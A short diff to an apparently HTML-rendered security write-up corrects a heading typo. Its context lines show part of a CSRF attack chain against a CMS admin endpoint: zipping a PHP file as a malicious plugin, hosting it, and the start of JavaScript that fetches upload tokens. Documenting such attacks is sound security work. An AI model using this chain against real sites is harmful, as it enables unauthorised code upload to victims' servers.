@@ -86,7 +86,7 @@ By analyzing the upload request, we notice that two tokens are passed as paramet
 └─$ zip spzrce.zip spzrce.php 
   adding: spzrce.php (stored 0%)
 </code></pre><p>Our plugin is ready, we can place it in a listening web server.</p>
-<h3 id="csrf-paylaod-construction">CSRF paylaod construction.</h3>
+<h3 id="csrf-payload-construction">CSRF payload construction.</h3>
 <p>On the first part we will make a request to get the tokens.</p>
 <pre><code class="language-javascript=" data-lang="javascript=">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
